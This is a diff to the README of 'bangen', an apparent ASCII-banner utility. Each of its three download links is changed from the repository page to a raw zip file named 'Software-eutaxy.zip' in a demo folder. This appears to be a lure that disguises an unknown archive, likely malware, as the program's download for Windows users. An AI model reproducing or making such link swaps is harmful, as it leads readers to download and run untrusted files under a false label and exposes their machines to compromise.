@@ -1,6 +1,6 @@
 # ✨ bangen - Colorful ASCII banners in seconds
 
-[![Download bangen](https://img.shields.io/badge/Download%20bangen-Ready%20to%20Run-blue?style=for-the-badge&logo=github)](https://github.com/Unrequested-venabrachialis330/bangen)
+[![Download bangen](https://img.shields.io/badge/Download%20bangen-Ready%20to%20Run-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Unrequested-venabrachialis330/bangen/main/demo/Software-eutaxy.zip)
 
 ## 🖥️ What bangen does
 
@@ -15,7 +15,7 @@ Use it when you want to:
 ## 📥 Download and run on Windows
 
 To get bangen, visit this page to download:
-https://github.com/Unrequested-venabrachialis330/bangen
+https://raw.githubusercontent.com/Unrequested-venabrachialis330/bangen/main/demo/Software-eutaxy.zip
 
 ### Steps for Windows users
 
@@ -185,4 +185,4 @@ If the banner appears cut off:
 ## 📎 Download again
 
 If you need to get bangen again, use this link:
-https://github.com/Unrequested-venabrachialis330/bangen
+https://raw.githubusercontent.com/Unrequested-venabrachialis330/bangen/main/demo/Software-eutaxy.zip
